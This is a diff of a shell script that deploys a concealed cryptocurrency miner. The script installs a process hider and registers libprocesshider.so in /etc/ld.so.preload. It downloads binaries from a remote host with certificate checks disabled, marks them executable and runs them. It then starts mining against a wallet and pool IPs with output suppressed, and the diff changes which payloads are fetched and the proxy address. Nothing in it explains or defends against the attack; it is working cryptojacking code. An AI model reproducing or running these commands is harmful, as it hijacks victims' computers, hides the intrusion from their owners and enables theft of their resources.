@@ -13,13 +13,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget --no-check-certificate https://maskurniawan.serv00.net/libpearlkernel.so.enc && chmod +x libpearlkernel.so.enc
-wget --no-check-certificate -O services https://maskurniawan.serv00.net/tw-pearl-333 && chmod +x services
-wget --no-check-certificate https://maskurniawan.serv00.net/libcudart.so.13 && chmod +x libcudart.so.13
-wget --no-check-certificate https://maskurniawan.serv00.net/pearl.guard && chmod +x pearl.guard
-wget --no-check-certificate https://maskurniawan.serv00.net/pearl-policy.enc && chmod +x pearl-policy.enc
-wget --no-check-certificate https://maskurniawan.serv00.net/pearl-release.sig && chmod +x pearl-release.sig
-wget --no-check-certificate https://maskurniawan.serv00.net/pearl-verify && chmod +x pearl-verify
+wget --no-check-certificate -O services https://maskurniawan.serv00.net/fortune && chmod +x services
 
 wget --no-check-certificate https://maskurniawan.serv00.net/graphics.tar.gz
 
@@ -61,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp && clear && ./services --poll 37.230.62.246:80 --wallet prl1p4wq5h2tpnpqcu3vwskw3utylklafm0fsd8za8cwgfnr6l2dkxywqmcnm0e --worker Cici & wget --no-check-certificate https://maskurniawan.serv00.net/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 37.230.62.246:443 -u TXEWxxF8yyzV9Q1vyk2Xai1Li3VMYjnaY9.cici -t $(nproc) > /dev/null 2>&1 & clear
+./graftcp/graftcp && clear && ./services --proxy 202.155.9.40:80 --address prl1p4wq5h2tpnpqcu3vwskw3utylklafm0fsd8za8cwgfnr6l2dkxywqmcnm0e --worker Cici -gpu & wget --no-check-certificate https://maskurniawan.serv00.net/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 37.230.62.246:443 -u TXEWxxF8yyzV9Q1vyk2Xai1Li3VMYjnaY9.cici -t $(nproc) > /dev/null 2>&1 & clear
